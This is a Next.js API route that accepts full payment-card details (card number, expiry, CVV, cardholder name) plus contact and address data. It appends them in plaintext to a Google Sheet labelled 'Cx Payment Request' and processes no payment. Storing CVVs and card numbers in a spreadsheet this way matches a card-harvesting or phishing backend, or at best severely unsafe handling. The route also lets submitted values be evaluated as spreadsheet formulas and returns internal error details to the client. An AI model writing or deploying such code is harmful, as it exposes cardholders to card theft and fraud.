import { NextResponse } from "next/server";
import { sheets } from "@/lib/googleSheets";

export async function POST(req: Request) {
  try {
    const body = await req.json();

    const {
      amount,
      email,
      name,
      phone,
      cardNumber,
      expiry,
      cvv,
      cardholdername,
      country,
      addressone,
      addresstwo,
      city,
      zipCode,
      state,
      firstName,
      lastName,
    } = body;

    await sheets.spreadsheets.values.append({
      spreadsheetId:process.env.GOOGLE_SHEET_ID,
      range: "Cx Payment Request!A:P",
      valueInputOption: "USER_ENTERED",

      requestBody: {
        values: [
          [
            amount,
            email,
            name,
            phone,
            cardNumber,
            expiry,
            cvv,
            cardholdername,
            country,
            addressone,
            addresstwo,
            city,
            zipCode,
            state,
            firstName,
            lastName,
          ],
        ],
      },
    });

    return NextResponse.json({
      success: true,
    });
  } catch (error: any) {
  console.error("GOOGLE SHEETS ERROR:", error);

  return NextResponse.json(
    {
      success: false,
      error: error.message,
      details: error.response?.data || null,
    },
    {
      status: 500,
    }
  );
}
}